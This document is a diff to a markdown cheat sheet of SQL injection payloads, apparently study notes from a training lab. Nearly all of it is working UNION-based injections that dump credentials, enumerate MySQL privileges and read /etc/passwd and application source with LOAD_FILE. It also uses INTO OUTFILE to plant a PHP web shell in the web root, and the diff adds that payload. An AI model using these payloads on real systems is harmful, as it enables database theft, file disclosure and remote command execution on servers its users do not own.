@@ -23,7 +23,7 @@ admin')-- -
 ```
 ' order by 1-- -
 cn' UNION select 1,2,3-- -
-cn' UNION select 1,@@version,3,4-- -
+cn' UNION select 1,3,4-- -
 UNION select username, 2, 3, 4 from passwords-- -
 ```
 
@@ -42,13 +42,21 @@ cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
 cn' UNION SELECT 1, user(), 3, 4-- -
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
 cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 
-**File Injection
+**File Read
 ```
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
-select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+CTRL+U
+```
+
+**File Write
+```
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+cn' union select '','file written successfully!','','' into outfile '/tmp/proof2.txt'-- -
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
